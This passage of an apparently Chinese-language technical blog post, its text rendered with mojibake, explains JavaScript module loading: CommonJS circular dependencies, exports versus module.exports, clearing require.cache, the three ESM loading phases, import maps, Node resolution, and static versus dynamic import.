<span class="hljs-keyword">const</span> b = <span class="hljs-built_in">require</span>(<span class="hljs-string">"./b"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"åœ¨ a ä¸­ï¼Œb.done ="</span>, b.<span class="hljs-property">done</span>);
<span class="hljs-built_in">exports</span>.<span class="hljs-property">done</span> = <span class="hljs-literal">true</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"a ç»“æŸ"</span>);

<span class="hljs-comment">// b.js</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"b å¼€å§‹"</span>);
<span class="hljs-built_in">exports</span>.<span class="hljs-property">done</span> = <span class="hljs-literal">false</span>;
<span class="hljs-keyword">const</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">"./a"</span>); <span class="hljs-comment">// æ­¤æ—¶ a æœªæ‰§è¡Œå®Œï¼Œexports.done = false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"åœ¨ b ä¸­ï¼Œa.done ="</span>, a.<span class="hljs-property">done</span>);
<span class="hljs-built_in">exports</span>.<span class="hljs-property">done</span> = <span class="hljs-literal">true</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"b ç»“æŸ"</span>);

<span class="hljs-comment">// main.js</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"./a"</span>);

<span class="hljs-comment">// è¾“å‡ºï¼š</span>
<span class="hljs-comment">// a å¼€å§‹</span>
<span class="hljs-comment">// b å¼€å§‹</span>
<span class="hljs-comment">// åœ¨ b ä¸­ï¼Œa.done = false</span>
<span class="hljs-comment">// b ç»“æŸ</span>
<span class="hljs-comment">// åœ¨ a ä¸­ï¼Œb.done = true</span>
<span class="hljs-comment">// a ç»“æŸ</span>
</code></pre>
<blockquote>
<p><strong>å®˜æ–¹æ–‡æ¡£</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fapi%2Fmodules.html%23cycles" target="_blank" title="https://nodejs.org/api/modules.html#cycles" ref="nofollow noopener noreferrer">Node.js Modules: Cycles</a></p>
</blockquote>
<h3 data-id="heading-9">ä¸è¦é‡æ–°èµ‹å€¼ exports</h3>
<p>ä¼ªæºç ç¬¬ 7 æ­¥æ‰§è¡ŒåŒ…è£…å‡½æ•°æ—¶ï¼Œå°† <code>module.exports</code> ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œèµ‹å€¼ç»™ <code>exports</code>ã€‚è¿™æ„å‘³ç€ <code>exports</code> åªæ˜¯ <code>module.exports</code> çš„å¼•ç”¨ã€‚ä¸€æ—¦é‡æ–°èµ‹å€¼ <code>module.exports</code>ï¼Œå¼•ç”¨å…³ç³»å°±æ–­å¼€ï¼Œä¹‹åä¿®æ”¹ <code>exports</code> å°±æ— æ³•å¯¼å‡ºäº†ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// module.js</span>
<span class="hljs-built_in">exports</span>.<span class="hljs-property">name</span> = <span class="hljs-string">"foo"</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-built_in">exports</span> === <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>); <span class="hljs-comment">// true</span>

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = { <span class="hljs-attr">version</span>: <span class="hljs-string">"1.0"</span> }; <span class="hljs-comment">// é‡æ–°èµ‹å€¼</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-built_in">exports</span> === <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>); <span class="hljs-comment">// false</span>

<span class="hljs-built_in">exports</span>.<span class="hljs-property">age</span> = <span class="hljs-number">18</span>; <span class="hljs-comment">// æ— æ•ˆï¼Œexports å·²å¤±æ•ˆ</span>

<span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">const</span> mod = <span class="hljs-built_in">require</span>(<span class="hljs-string">"./module"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mod); <span class="hljs-comment">// { version: '1.0' }</span>
</code></pre>
<h3 data-id="heading-10">ç¼“å­˜æ¸…é™¤ä¸æ¨¡å—é‡è½½</h3>
<p>ç”±äº <code>require.cache</code> æ˜¯ä¸€ä¸ªæ™®é€šçš„ JavaScript å¯¹è±¡ï¼Œå¯ä»¥é€šè¿‡åˆ é™¤ç¼“å­˜æ¥å¼ºåˆ¶é‡æ–°åŠ è½½æ¨¡å—ã€‚è¿™åœ¨å¼€å‘çƒ­é‡è½½ç­‰åœºæ™¯ä¸­å¾ˆæœ‰ç”¨ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// module.js</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æ¨¡å—æ‰§è¡Œ"</span>);
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = { <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() };

<span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">const</span> mod1 = <span class="hljs-built_in">require</span>(<span class="hljs-string">"./module"</span>); <span class="hljs-comment">// è¾“å‡º: æ¨¡å—æ‰§è¡Œ</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mod1.<span class="hljs-property">timestamp</span>);

<span class="hljs-comment">// åˆ é™¤ç¼“å­˜</span>
<span class="hljs-keyword">delete</span> <span class="hljs-built_in">require</span>.<span class="hljs-property">cache</span>[<span class="hljs-built_in">require</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">"./module"</span>)];

<span class="hljs-keyword">const</span> mod2 = <span class="hljs-built_in">require</span>(<span class="hljs-string">"./module"</span>); <span class="hljs-comment">// å†æ¬¡è¾“å‡º: æ¨¡å—æ‰§è¡Œ</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mod2.<span class="hljs-property">timestamp</span>); <span class="hljs-comment">// ä¸åŒçš„æ—¶é—´æˆ³</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(mod1 === mod2); <span class="hljs-comment">// false</span>
</code></pre>
<blockquote>
<p><strong>å®˜æ–¹æ–‡æ¡£</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fapi%2Fmodules.html%23requirecache" target="_blank" title="https://nodejs.org/api/modules.html#requirecache" ref="nofollow noopener noreferrer">Node.js Modules: require.cache</a></p>
</blockquote>
<h2 data-id="heading-11">ESM åŠ è½½æœºåˆ¶</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Ftc39.es%2Fecma262%2F%23sec-modules" target="_blank" title="https://tc39.es/ecma262/#sec-modules" ref="nofollow noopener noreferrer">ESM</a> æ˜¯ ECMAScript æ ‡å‡†å®šä¹‰çš„æ¨¡å—ç³»ç»Ÿï¼Œæ˜¯<strong>è¯­è¨€å±‚é¢çš„ç‰¹æ€§</strong>ã€‚ä¸åŒäº CJS çš„è¿è¡Œæ—¶åŠ è½½ï¼ŒESM åœ¨ä»£ç æ‰§è¡Œå‰è¿›è¡Œé™æ€åˆ†æï¼Œç¡®å®šæ¨¡å—ä¾èµ–å…³ç³»ã€‚</p>
<h3 data-id="heading-12">ESM åŠ è½½è¿‡ç¨‹</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fhacks.mozilla.org%2F2018%2F03%2Fes-modules-a-cartoon-deep-dive" target="_blank" title="https://hacks.mozilla.org/2018/03/es-modules-a-cartoon-deep-dive" ref="nofollow noopener noreferrer">ESM çš„åŠ è½½è¿‡ç¨‹</a>æ˜¯å°†å…¥å£æ–‡ä»¶ï¼ˆentry point fileï¼‰è½¬æ¢ä¸ºæ¨¡å—å®ä¾‹ï¼ˆmodule instanceï¼‰çš„è¿‡ç¨‹ã€‚è¿™ä¸ªè¿‡ç¨‹åˆ†ä¸ºä¸‰ä¸ªé˜¶æ®µï¼š<strong>Construction</strong>ï¼ˆæ„å»ºï¼‰ã€<strong>Instantiation</strong>ï¼ˆå®ä¾‹åŒ–ï¼‰ã€<strong>Evaluation</strong>ï¼ˆæ±‚å€¼ï¼‰ã€‚</p>
<h4 data-id="heading-13">æ ¸å¿ƒæ¦‚å¿µ</h4>
<p><strong>Module Recordï¼ˆæ¨¡å—è®°å½•ï¼‰</strong>ï¼š</p>
<ul>
<li>æ–‡ä»¶è¢«è§£æåç”Ÿæˆçš„æ•°æ®ç»“æ„</li>
<li>åŒ…å«æ¨¡å—çš„ import/export ä¿¡æ¯ã€ä»£ç ç­‰</li>
</ul>
<p><strong>Module Instanceï¼ˆæ¨¡å—å®ä¾‹ï¼‰</strong>ï¼š</p>
<ul>
<li>ç”±ä»£ç ï¼ˆcodeï¼‰å’ŒçŠ¶æ€ï¼ˆstateï¼‰ç»„æˆ</li>
<li>ä»£ç æ˜¯æŒ‡ä»¤é›†ï¼ˆå¦‚ä½•åšäº‹çš„é…æ–¹ï¼‰</li>
<li>çŠ¶æ€æ˜¯å˜é‡çš„å®é™…å€¼ï¼ˆå­˜å‚¨åœ¨å†…å­˜ä¸­ï¼‰</li>
</ul>
<p><strong>Entry Point Fileï¼ˆå…¥å£æ–‡ä»¶ï¼‰</strong>ï¼š</p>
<ul>
<li>æ¨¡å—å›¾çš„èµ·ç‚¹</li>
<li>æµè§ˆå™¨é€šè¿‡ <code>&lt;script type="module" src="main.js"&gt;</code> æŒ‡å®šå…¥å£</li>
</ul>
<h4 data-id="heading-14">é˜¶æ®µ 1ï¼šConstructionï¼ˆæ„å»ºï¼‰</h4>
<p>æŸ¥æ‰¾ã€è·å–ã€è§£ææ–‡ä»¶ï¼Œæ„å»ºæ¨¡å—å›¾ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[å…¥å£æ–‡ä»¶ main.js] --&gt; B[è§£æ import è¯­å¥]
    B --&gt; C[æ‰¾åˆ°ä¾èµ– counter.js]
    C --&gt; D[è·å– counter.js]
    D --&gt; E[è§£æ counter.js]
    E --&gt; F[é€’å½’å¤„ç†æ‰€æœ‰ä¾èµ–]
    F --&gt; G[ç”Ÿæˆ Module Records]
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ul>
<li>Loader è´Ÿè´£æŸ¥æ‰¾å’Œè·å–æ–‡ä»¶ï¼Œæµè§ˆå™¨å’Œ Node çš„ loader ä¸åŒ</li>
<li>è§£ææ—¶è¯†åˆ«æ‰€æœ‰é™æ€ <code>import/export</code> å£°æ˜</li>
<li>é€å±‚æ„å»ºå®Œæ•´çš„æ¨¡å—ä¾èµ–å›¾</li>
<li>åŠ¨æ€ <code>import()</code> ä¸åœ¨æ­¤é˜¶æ®µå¤„ç†</li>
</ul>
<p><strong>Module Mapï¼ˆæ¨¡å—æ˜ å°„ï¼‰</strong>ï¼š</p>
<ul>
<li>Loader ä½¿ç”¨ Module Map ç¼“å­˜æ¨¡å—</li>
<li>é”®æ˜¯æ¨¡å—çš„å”¯ä¸€æ ‡è¯†ï¼Œå€¼æ˜¯ Module Record</li>
<li>ç¡®ä¿æ¯ä¸ªæ¨¡å—åªè¢«åŠ è½½å’Œè§£æä¸€æ¬¡</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Module Map ç¤ºä¾‹ï¼ˆæ¦‚å¿µï¼‰</span>
{
  <span class="hljs-string">'https://example.com/main.js'</span>: <span class="hljs-title class_">ModuleRecord</span> { ... },
  <span class="hljs-string">'https://example.com/counter.js'</span>: <span class="hljs-title class_">ModuleRecord</span> { ... }
}
</code></pre>
<h4 data-id="heading-15">é˜¶æ®µ 2ï¼šInstantiationï¼ˆå®ä¾‹åŒ–ï¼‰</h4>
<p>åœ¨å†…å­˜ä¸­ä¸ºå¯¼å‡ºå€¼åˆ†é…ç©ºé—´ï¼Œå»ºç«‹ import/export çš„å®æ—¶ç»‘å®šï¼ˆlive bindingsï¼‰ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[éå†æ¨¡å—å›¾] --&gt; B[åˆ›å»º Module Environment Record]
    B --&gt; C[ä¸º export åœ¨å†…å­˜ä¸­åˆ†é…ç©ºé—´]
    C --&gt; D[å»ºç«‹ import/export çš„å®æ—¶ç»‘å®š]
    D --&gt; E[éªŒè¯æ‰€æœ‰ import æœ‰å¯¹åº”çš„ export]
</code></pre>
<p><strong>å®æ—¶ç»‘å®šï¼ˆLive Bindingsï¼‰</strong>ï¼š</p>
<ul>
<li>Export å’Œ import æŒ‡å‘å†…å­˜ä¸­çš„åŒä¸€ä¸ªä½ç½®</li>
<li>å¯¼å‡ºæ¨¡å—ä¿®æ”¹å€¼ï¼Œå¯¼å…¥æ¨¡å—èƒ½çœ‹åˆ°å˜åŒ–</li>
<li>ä¸ CJS çš„å€¼æ‹·è´ä¸åŒ</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// counter.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>;
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">increment</span>(<span class="hljs-params"/>) {
  count++; <span class="hljs-comment">// ä¿®æ”¹ count</span>
}

<span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">import</span> { count, increment } <span class="hljs-keyword">from</span> <span class="hljs-string">"./counter.js"</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count); <span class="hljs-comment">// 0</span>
<span class="hljs-title function_">increment</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(count); <span class="hljs-comment">// 1ï¼ˆå®æ—¶ç»‘å®šï¼Œçœ‹åˆ°äº†å˜åŒ–ï¼‰</span>
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ul>
<li>æ­¤é˜¶æ®µåªåˆ†é…å†…å­˜ï¼Œ<strong>ä¸å¡«å……å€¼</strong></li>
<li>å¯¼å‡ºçš„å‡½æ•°å£°æ˜ä¼šåœ¨æ­¤é˜¶æ®µåˆå§‹åŒ–</li>
<li>ä½¿ç”¨æ·±åº¦ä¼˜å…ˆååºéå†ï¼ˆdepth-first post-order traversalï¼‰</li>
</ul>
<h4 data-id="heading-16">é˜¶æ®µ 3ï¼šEvaluationï¼ˆæ±‚å€¼ï¼‰</h4>
<p>æ‰§è¡Œæ¨¡å—çš„é¡¶å±‚ä»£ç ï¼ˆtop-level codeï¼‰ï¼Œå¡«å……å†…å­˜ä¸­çš„å€¼ã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[æŒ‰ä¾èµ–é¡ºåºæ‰§è¡Œæ¨¡å—] --&gt; B[æ‰§è¡Œé¡¶å±‚ä»£ç ]
    B --&gt; C[å¡«å……å¯¼å‡ºå€¼]
    C --&gt; D{æœ‰å‰¯ä½œç”¨?}
    D --&gt;|æ˜¯| E[è§¦å‘å‰¯ä½œç”¨&lt;br&gt;å¦‚ç½‘ç»œè¯·æ±‚]
    D --&gt;|å¦| F[å®Œæˆ]
    E --&gt; F
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ul>
<li>é¡¶å±‚ä»£ç ï¼šå‡½æ•°å¤–çš„ä»£ç </li>
<li>æ¯ä¸ªæ¨¡å—åªæ±‚å€¼ä¸€æ¬¡ï¼ˆModule Map ç¡®ä¿ï¼‰</li>
<li>å¯èƒ½äº§ç”Ÿå‰¯ä½œç”¨ï¼ˆside effectsï¼‰ï¼šç½‘ç»œè¯·æ±‚ã€ä¿®æ”¹ DOM ç­‰</li>
<li>æ·±åº¦ä¼˜å…ˆååºéå†ï¼šå…ˆæ±‚å€¼ä¾èµ–ï¼Œå†æ±‚å€¼å½“å‰æ¨¡å—</li>
</ul>
<h3 data-id="heading-17">æµè§ˆå™¨å’Œ Node.js çš„ Construction å·®å¼‚</h3>
<p>ESM çš„ä¸‰é˜¶æ®µåŠ è½½æµç¨‹åœ¨æµè§ˆå™¨å’Œ Node.js ä¸­æ˜¯ä¸€è‡´çš„ï¼Œä½†åœ¨ Construction é˜¶æ®µå­˜åœ¨å·®å¼‚ã€‚Construction åŒ…å«ä¸¤ä¸ªè¿‡ç¨‹ï¼š<strong>Module Resolution</strong>ï¼ˆæ¨¡å—è§£æï¼Œç¡®å®šæ¨¡å—è·¯å¾„ï¼‰å’Œ <strong>Fetch</strong>ï¼ˆè·å–æ–‡ä»¶ï¼‰ã€‚</p>
<h4 data-id="heading-18">æµè§ˆå™¨</h4>
<p><strong>Module Resolution</strong>ï¼ˆæ¨¡å—è§£æï¼‰ï¼š</p>
<p>æµè§ˆå™¨ä½¿ç”¨å®Œæ•´çš„ URL ä½œä¸ºæ¨¡å—æ ‡è¯†ç¬¦ã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- å…¥å£æ–‡ä»¶ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"module"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/main.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// main.js - å¿…é¡»ä½¿ç”¨ç›¸å¯¹è·¯å¾„æˆ–ç»å¯¹è·¯å¾„</span>
<span class="hljs-keyword">import</span> { add } <span class="hljs-keyword">from</span> <span class="hljs-string">"./math.js"</span>; <span class="hljs-comment">// âœ… ç›¸å¯¹è·¯å¾„</span>
<span class="hljs-keyword">import</span> { config } <span class="hljs-keyword">from</span> <span class="hljs-string">"/config.js"</span>; <span class="hljs-comment">// âœ… ç»å¯¹è·¯å¾„</span>
<span class="hljs-keyword">import</span> { api } <span class="hljs-keyword">from</span> <span class="hljs-string">"https://cdn.example.com/api.js"</span>; <span class="hljs-comment">// âœ… å®Œæ•´ URL</span>

<span class="hljs-comment">// âŒ è£¸æ¨¡å—æ ‡è¯†ç¬¦ï¼ˆbare specifierï¼‰ä¸æ”¯æŒ</span>
<span class="hljs-keyword">import</span> { lodash } <span class="hljs-keyword">from</span> <span class="hljs-string">"lodash"</span>; <span class="hljs-comment">// æŠ¥é”™ï¼šFailed to resolve module specifier</span>
</code></pre>
<p><strong>Import Maps</strong>ï¼šæµè§ˆå™¨é€šè¿‡ Import Maps æ”¯æŒè£¸æ¨¡å—æ ‡è¯†ç¬¦ã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"importmap"</span>&gt;</span><span class="javascript">
  {
    <span class="hljs-string">"imports"</span>: {
      <span class="hljs-string">"lodash"</span>: <span class="hljs-string">"https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.js"</span>,
      <span class="hljs-string">"vue"</span>: <span class="hljs-string">"/node_modules/vue/dist/vue.esm-browser.js"</span>
    }
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"module"</span>&gt;</span><span class="javascript">
  <span class="hljs-keyword">import</span> _ <span class="hljs-keyword">from</span> <span class="hljs-string">"lodash"</span>; <span class="hljs-comment">// âœ… è§£æä¸º https://cdn.jsdelivr.net/npm/...</span>
  <span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span>; <span class="hljs-comment">// âœ… è§£æä¸º /node_modules/vue/...</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<blockquote>
<p><strong>å®˜æ–¹æ–‡æ¡£</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fhtml.spec.whatwg.org%2Fmultipage%2Fwebappapis.html%23import-maps" target="_blank" title="https://html.spec.whatwg.org/multipage/webappapis.html#import-maps" ref="nofollow noopener noreferrer">HTML Standard: Import maps</a></p>
</blockquote>
<p><strong>Fetch</strong>ï¼ˆè·å–æ–‡ä»¶ï¼‰ï¼š</p>
<ul>
<li><strong>å¹¶è¡Œä¸‹è½½</strong>ï¼šæµè§ˆå™¨ä¼šå¹¶è¡Œå‘èµ·å¤šä¸ª HTTP è¯·æ±‚ä¸‹è½½ä¾èµ–æ¨¡å—</li>
<li><strong>é˜»å¡è¡Œä¸º</strong>ï¼šå¿…é¡»ç­‰æ‰€æœ‰ä¾èµ–ä¸‹è½½å®Œæ‰èƒ½è¿›å…¥ Instantiation é˜¶æ®µ</li>
<li><strong>éé˜»å¡æ¸²æŸ“</strong>ï¼š<code>&lt;script type="module"&gt;</code> é»˜è®¤å…·æœ‰ <code>defer</code> ç‰¹æ€§ï¼Œä¸ä¼šé˜»å¡é¡µé¢æ¸²æŸ“</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[Module Resolution:&lt;br/&gt;è§£ææ¨¡å—è·¯å¾„] --&gt; B[Fetch: å‘èµ· HTTP è¯·æ±‚]
    B --&gt; C[å¹¶è¡Œä¸‹è½½ a.js]
    B --&gt; D[å¹¶è¡Œä¸‹è½½ b.js]
    B --&gt; E[å¹¶è¡Œä¸‹è½½ c.js]
    C --&gt; F[ç­‰å¾…æ‰€æœ‰ä¾èµ–ä¸‹è½½å®Œæˆ]
    D --&gt; F
    E --&gt; F
    F --&gt; G[è¿›å…¥ Instantiation é˜¶æ®µ]
</code></pre>
<h4 data-id="heading-19">Node.js</h4>
<p><strong>Module Resolution</strong>ï¼ˆæ¨¡å—è§£æï¼‰ï¼š</p>
<p>Node.js æ”¯æŒè£¸æ¨¡å—æ ‡è¯†ç¬¦ï¼Œä½¿ç”¨å¤æ‚çš„è§£æç®—æ³•æŸ¥æ‰¾æ¨¡å—ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Node.js æ”¯æŒå¤šç§å¯¼å…¥æ–¹å¼</span>
<span class="hljs-keyword">import</span> { readFile } <span class="hljs-keyword">from</span> <span class="hljs-string">"fs"</span>; <span class="hljs-comment">// âœ… å†…ç½®æ¨¡å—</span>
<span class="hljs-keyword">import</span> express <span class="hljs-keyword">from</span> <span class="hljs-string">"express"</span>; <span class="hljs-comment">// âœ… node_modules æŸ¥æ‰¾</span>
<span class="hljs-keyword">import</span> { add } <span class="hljs-keyword">from</span> <span class="hljs-string">"./math.js"</span>; <span class="hljs-comment">// âœ… ç›¸å¯¹è·¯å¾„</span>
<span class="hljs-keyword">import</span> { config } <span class="hljs-keyword">from</span> <span class="hljs-string">"/abs/path/config.js"</span>; <span class="hljs-comment">// âœ… ç»å¯¹è·¯å¾„</span>
</code></pre>
<p>Node.js çš„è§£æç®—æ³•ï¼š</p>
<ol>
<li><strong>å†…ç½®æ¨¡å—</strong>ï¼šå¦‚ <code>fs</code>ã€<code>path</code>ï¼Œç›´æ¥è¿”å›</li>
<li><strong>ç›¸å¯¹/ç»å¯¹è·¯å¾„</strong>ï¼šæŒ‰è·¯å¾„æŸ¥æ‰¾</li>
<li><strong>è£¸æ¨¡å—æ ‡è¯†ç¬¦</strong>ï¼šä»å½“å‰ç›®å½•å¼€å§‹ï¼Œé€å±‚å‘ä¸ŠæŸ¥æ‰¾ <code>node_modules</code></li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å½“å‰æ–‡ä»¶ï¼š/project/src/index.js</span>
<span class="hljs-keyword">import</span> express <span class="hljs-keyword">from</span> <span class="hljs-string">"express"</span>;

<span class="hljs-comment">// Node.js æŸ¥æ‰¾é¡ºåºï¼š</span>
<span class="hljs-comment">// 1. /project/src/node_modules/express</span>
<span class="hljs-comment">// 2. /project/node_modules/express</span>
<span class="hljs-comment">// 3. /node_modules/express</span>
</code></pre>
<p><strong>package.json çš„ exports å­—æ®µ</strong>ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"my-package"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"exports"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"."</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./dist/index.js"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"./utils"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./dist/utils.js"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> pkg <span class="hljs-keyword">from</span> <span class="hljs-string">"my-package"</span>; <span class="hljs-comment">// è§£æä¸º ./dist/index.js</span>
<span class="hljs-keyword">import</span> utils <span class="hljs-keyword">from</span> <span class="hljs-string">"my-package/utils"</span>; <span class="hljs-comment">// è§£æä¸º ./dist/utils.js</span>
</code></pre>
<blockquote>
<p><strong>å®˜æ–¹æ–‡æ¡£</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fapi%2Fpackages.html%23package-entry-points" target="_blank" title="https://nodejs.org/api/packages.html#package-entry-points" ref="nofollow noopener noreferrer">Node.js: Modules: Packages</a> | <a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fapi%2Fesm.html%23resolution-algorithm" target="_blank" title="https://nodejs.org/api/esm.html#resolution-algorithm" ref="nofollow noopener noreferrer">Node.js: ECMAScript modules</a></p>
</blockquote>
<p><strong>Fetch</strong>ï¼ˆè·å–æ–‡ä»¶ï¼‰ï¼š</p>
<ul>
<li><strong>åŒæ­¥è¯»å–</strong>ï¼šNode.js ä½¿ç”¨åŒæ­¥ I/O è¯»å–æœ¬åœ°æ–‡ä»¶</li>
<li><strong>æ— ç½‘ç»œå»¶è¿Ÿ</strong>ï¼šè¯»å–æœ¬åœ°æ–‡ä»¶é€Ÿåº¦å¿«ï¼Œä½†ä»éœ€ç­‰å¾…æ‰€æœ‰ä¾èµ–è¯»å–å®Œ</li>
<li><strong>æ€§èƒ½å½±å“</strong>ï¼šå¤§é‡æ¨¡å—æ—¶æ–‡ä»¶ I/O ä»æœ‰æ€§èƒ½å½±å“</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[Module Resolution:&lt;br/&gt;è§£ææ¨¡å—è·¯å¾„] --&gt; B[Fetch: åŒæ­¥è¯»å– a.js]
    B --&gt; C[åŒæ­¥è¯»å– b.js]
    C --&gt; D[åŒæ­¥è¯»å– c.js]
    D --&gt; E[æ‰€æœ‰æ–‡ä»¶è¯»å–å®Œæˆ]
    E --&gt; F[è¿›å…¥ Instantiation é˜¶æ®µ]
</code></pre>
<h3 data-id="heading-20">åŠ¨æ€ import</h3>
<p>ESM æä¾›ä¸¤ç§å¯¼å…¥æ–¹å¼ï¼š<strong>é™æ€å¯¼å…¥</strong>ï¼ˆ<code>import</code> å£°æ˜ï¼‰å’Œ<strong>åŠ¨æ€å¯¼å…¥</strong>ï¼ˆ<code>import()</code> å‡½æ•°ï¼‰ã€‚</p>
<h4 data-id="heading-21">é™æ€å¯¼å…¥</h4>
<p>é™æ€å¯¼å…¥åœ¨ Construction é˜¶æ®µå¤„ç†ï¼Œå¿…é¡»åœ¨æ¨¡å—é¡¶å±‚ä½¿ç”¨ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// âœ… é¡¶å±‚é™æ€å¯¼å…¥</span>
<span class="hljs-keyword">import</span> { add } <span class="hljs-keyword">from</span> <span class="hljs-string">"./math.js"</span>;
<span class="hljs-keyword">import</span> express <span class="hljs-keyword">from</span> <span class="hljs-string">"express"</span>;

<span class="hljs-comment">// âŒ ä¸èƒ½åœ¨ä»£ç å—ã€å‡½æ•°ã€æ¡ä»¶è¯­å¥ä¸­ä½¿ç”¨</span>
<span class="hljs-keyword">if</span> (condition) {
  <span class="hljs-keyword">import</span> { add } <span class="hljs-keyword">from</span> <span class="hljs-string">"./math.js"</span>; <span class="hljs-comment">// SyntaxError</span>
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">loadModule</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">import</span> express <span class="hljs-keyword">from</span> <span class="hljs-string">"express"</span>; <span class="hljs-comment">// SyntaxError</span>
}
</code></pre>
<p><strong>ç‰¹ç‚¹</strong>ï¼š</p>
<ul>
<li>åœ¨ä»£ç æ‰§è¡Œå‰å®Œæˆï¼ˆConstruction é˜¶æ®µï¼‰</li>
<li>æ”¯æŒé™æ€åˆ†æï¼šæ‰“åŒ…å·¥å…·å¯è¿›è¡Œ tree-shaking</li>
<li>è·¯å¾„å¿…é¡»æ˜¯é™æ€å­—ç¬¦ä¸²ï¼ˆä¸èƒ½æ˜¯å˜é‡ï¼‰</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-string">'./math.js'</span>;
<span class="hljs-keyword">import</span> { add } <span class="hljs-keyword">from</span> path;  <span class="hljs-comment">// âŒ SyntaxError</span>
</code></pre>
<h4 data-id="heading-22">åŠ¨æ€å¯¼å…¥ import()</h4>
<p><code>import()</code> æ˜¯ä¸€ä¸ªè¿”å› Promise çš„å‡½æ•°ï¼Œå¯åœ¨ä»»æ„ä½ç½®ä½¿ç”¨ã€‚</p>
